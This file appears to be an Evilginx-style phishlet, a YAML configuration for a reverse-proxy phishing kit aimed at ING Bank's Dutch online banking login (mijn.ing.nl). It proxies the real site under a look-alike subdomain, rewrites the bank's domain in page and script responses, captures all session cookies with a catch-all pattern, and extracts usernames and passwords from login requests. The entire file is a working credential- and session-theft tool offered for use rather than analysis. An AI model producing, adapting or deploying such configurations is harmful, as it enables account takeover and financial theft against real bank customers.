author: '@hash3liZer'
min_ver: '2.3.0'

proxy_hosts:
 - {phish_sub: 'www', orig_sub: 'mijn', domain: 'ing.nl', session: true, is_landing: true, auto_filter: false}


sub_filters:
 - {triggers_on: 'mijn.ing.nl', orig_sub: 'mijn', domain: 'ing.nl', search: 'mijn.ing.nl', replace: 'www.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}


auth_tokens:
 - domain: 'mijn.ing.nl'
   keys: ['.*,regexp']
 

credentials:
 username:
  key: ''
  search: '"username":"([^"]*)'
  type: 'json'
 password:
  key: ''
  search: '"password":"([^"]*)'
  type: 'json'

auth_urls:
 - '/asdasdsa/somerandom/'

login:
 domain: 'mijn.ing.nl'
 path: '/login'